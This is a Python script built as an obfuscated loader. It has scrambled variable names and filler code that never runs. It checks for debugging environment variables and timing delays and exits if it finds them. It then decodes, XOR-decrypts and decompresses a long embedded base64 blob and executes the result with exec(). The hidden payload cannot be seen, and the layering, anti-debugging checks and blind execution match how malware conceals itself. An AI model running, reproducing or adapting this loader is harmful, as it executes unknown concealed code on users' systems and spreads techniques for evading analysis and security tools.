
import base64 as szFYeBbj, zlib as PRLnoJYU, marshal as NMdDlkXo, hashlib as __h, os as dEIwrOKk, sys as UQPCzRsN, time as TTmalErR

WoFuFhpv = 7884
jLUORhVu = 'VIeoM6J9YJzA'
oWVxhNav = lambda x: x

def ijjQgjpd():
    x = 0
    for i in range(5):
        x += i
    return x


LdgNYOgI = [231, 192, 213, 214, 216, 209, 255, 219, 208, 221, 134, 133, 231, 213, 216, 192, 231, 192, 198, 221, 218, 211, 224, 241, 216, 243]
JfgYfMEF = 180
rvSfWcSG = ''.join(chr(b ^ JfgYfMEF) for b in LdgNYOgI)
AuGiEQoN = __h.sha256(rvSfWcSG.encode()).digest()

def YLxhPqvi():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if dEIwrOKk.environ.get(v):
            UQPCzRsN.exit(1)
    t1 = TTmalErR.time()
    TTmalErR.sleep(0.1)
    t2 = TTmalErR.time()
    if t2 - t1 > 0.5:
        UQPCzRsN.exit(1)

YLxhPqvi()

WRVwwCcf_data = ["Kp/GArX96oxcoqTiGXx0UbjBJoPzqhla3y8v6N2z9Pi67dlsha27UHe1bBYlxz2HyllYo6jOo6B/h/33MUqCNyNdP+tfpV5t424jtF6vgyc+7T1HGme+AS1R", "IfI4Z2TQyYt67D2fOvhCxI8XlnX6IsCb2e2otPqH4ZCBeI3JMD1Fn5XlBUBMS1Gfe6J1GAxj3JQDiDXJl8uKNVtypVcTn009edZ+iG/VTq8tc28LX/bUzDP0", "sKKAEfoLxCgJBBo0tMcxRqh0xaIz18syElg1NOBc/qWAQHgl5bFSIsdOQCZYlhMVVvACz7tFoi/CIlY7Qre157+N63HtL+p3WNiSdgog0G1koU1FfJs92mnS", "Py0VXi/P3yVVSGLMXh8W6EC0ErEq8feNQNfnFqWEf1GpDEpwHka/WBKUSGB4GETzo2XaWvWmT4VPozItIJ8pFZYisuW8/L0MWkIhZOOxS68EpUznSYyQYfig", "3qkxH7ybD9NyPJMqZdUvGXlRl7XmPKohqtPHYG4e7e99t84k7bG+Zoizwiq9tJ0NZBgQkDwPP5uR0YTX/K3TewvPYNUDbexIiUhTACyCwGKvZnq0jyusqSpX", "K0zy2uwhH3Mvrp1udvUIFcGAJKPyqoQe+QcP6l6hvIyqIEtw1YtPQXiPRYC+9+C0TMdJ83m4uDNRjI0hwvoLTTvf9+kKSrREGbDZfcOtRd2oPoLxL9beL9yv", "q/yBaCmvk3KDaupt8Cuc/14t5lA4P6XzYpnf+zx2JxcUfnz43FM+cfzGJV8cOhKyW2bNHXq1MBr2TT4OY1O56P2WXsmUrsA4oD1HVp/XJzkFFpTEjaLiKcNb", "ontcdTp30v3MeaW7cuPG6xCz11+UpkDfvrolgA6VQeuJwI9KPlDcNA8zT8lHKjlM5vAx4dPuDm8bvA/59l/S80OhtBcTbgawn/i3yHhtWYFnhqYfhrDxjdOj", "Jy7hxjKiyHHnUnBpc93ffjwPGlNJUrG5IugKp9G83tJjhFogj3EubnnIUjTxQNxM1hTJbBCr1iDzc4wjB6S6C0NStqp3Utkfo+htDaMN89y8O+32NJEnD1Ph", "oGc1p4Pk6Xjr5RR3JflcdcsOJuDDUGEZfJ/41sXps2Mr8gIrzzdNrjtD8OO6lcHiphozec06OLMgnBfI+D8uL6TlahI/LtJJOQ0RbCDKW9WVsghZiigsAaOp", "fb+xlwdVYG4mtn+A1xIKWtyiDKSwoMbakpFAjCieUcqqVXJq0iKORO8UjuiUuYrnqlrYUU8Jb0NrVy61Udk2UjQtJDNiCVsnx6GTgotOd536MP5IiRO1vsVX", "G1QagmdoZLx/PX5IZIOuk0afvjB/e4lx5PLc59ww2if+YxF0VcUWDfHiyqGZPWgv9S5s0vqdPavFWhtieWpFKkBNMeMwGuUSV4VT3R5EtPQz/8ngRpBx6+4p", "AZ++lb9CblHggRJJSbRMTxhaN8VNzZF9C+uqOnMWSZjkS1FyZC2U/QD3fG4wQR6pZAkxBlpX4ITt9jC2m5pTjbgbNRepklH1//WDskCRUdq2M5JdcU7ajNoe", "vzONYLw2FmA5J4eY26j+0eNoW09LXwJDqPQS7hr0Rkiq9/D0pk4TiaTaIuHZkvFWJaCOx/YNJ6tjz/PhiMZNA5c2Ffq5auq8eY4gM051LGmLCbLZ1hPidvlC", "drTSuJwEK1LOjE3YSQJZzdahPO85AtqYD84PidG5O6hJb+yeEDBgyXhTtVUxA73K9k+qewbpz9pLUT7VgMMv9XoIsPEdF2YQ5y4x6HxDQ+N/Cq5WI/hpVrBE", "jUv2Hy6+v4VhwLes4yYJ/h0Dwo5U3kHzpOCQSJbxSUsRn96agWlS9+tF3uqLZHM+H03bNowctrvdTrYYw/JGP/IJiWiWoihhE/w9ureoMCgxOKDDSuG/gaFG", "BwesPy9GzJbnmxx8ks9pgN6gbTyR3oD0duZ7mpkSCI2TYmQWrCEQRpISeW+hWUFvQgLVjOFGP0qL5JbRscb9LXgH/NZraTZdg9YJKpobkbvQS9I5ACnoCZhH", "+GHFP4bdHBUfm6VBPRjwtlIffl+hBEUw1E+RdE+OEtygKKiP0e4CFDMGlLc2w3R4LdxnmifOMS7YRuppQUU44ugUi4SKH4BkBPrP3Thk6U/K67c8wIvLyfol", "b/bWPnHJrwyNk4trM27VtwqnNTH19wJ93AAvnYe/qj4MQeqORSKI/eGNcgT/6hpjXrDmLWkzBge4XyObygqmpkhfWLYtPsB0nmjwqSsU2Md8D48n6bhXswAH", "7AD2x5dSb/0iLILbJ2X9+QB6XuR1e6k9CyaB3LFAHL+E7l+RlUw1CfCF4ghnPCPUvxKY49A872z7V4zBqeuF1w1RMLsbKV2bE+vonKLjnyMHrnC2C69XCcTy", "8Xl+fUdrm+pDsEMFaZ6+pVGx9f0rcomk1INb8oU7EVp2FiyYMTm8oae0yMO/nLj5eyWzFvS9ijW7o56+oALMk5jfGcOd/sV0vaJBvZLyeiOkUnStqknCCby8", "RG4pjpW2L/M3/hurlukZPf1uiom6yZe79NEDkyULe/pGjtp7fFis28r9kpUA9CSACOaoOKwjj04iN7Yjp7gVpG0orYxNqkjZr4CjLh0loqG6XE1PiXroj+a7", "k8D09U8AdqPHk6yURi0HGanCp2RYApOrw/jw7pWuZQX8YTqutoS1OimzzNCf7HGU+xD0e3H1WBWVyRfrzdGw/6TIL6iHQaLKGzglf5CGuxNtB05eu7nMUYBU", "D8kFjFSv7T1sfi8rUTh1hYAG0s0lK1+6LfeMSbvdbY3wrK/QhaiUWrwebtgKZbqxsRCiYkJG/hTOrJsNb17lOl5Uw4ct"]
WRVwwCcf_key = ["8xEAAADiVVgWe7fX1HpssVKGNNTiMA=="]

WRVwwCcf_data_joined = ''.join(WRVwwCcf_data)
WRVwwCcf_key_joined = ''.join(WRVwwCcf_key)

jVmdImpn = szFYeBbj.b64decode(WRVwwCcf_key_joined)
maFRVeUn = NMdDlkXo.loads(jVmdImpn)
EsqJIRCp = bytes([b ^ AuGiEQoN[i % len(AuGiEQoN)] for i, b in enumerate(maFRVeUn)]).decode()

WRVwwCcf_enc = szFYeBbj.b64decode(WRVwwCcf_data_joined)
jNLIKsPG = bytes([b ^ ord(EsqJIRCp[i % len(EsqJIRCp)]) for i, b in enumerate(WRVwwCcf_enc)])
AXyCQNng = PRLnoJYU.decompress(jNLIKsPG)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(AXyCQNng)
